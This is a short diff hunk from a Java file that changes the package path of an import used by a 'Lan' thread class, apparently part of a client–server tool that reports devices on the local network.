@@ -3,7 +3,7 @@ import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
 import com.redpois0n.common.OperatingSystem;
-import com.redpois0n.packets.outgoing.Packet49LanDevices;
+import com.redpois0n.stub.packets.outgoing.Packet49LanDevices;
 
 
 public class Lan extends Thread {
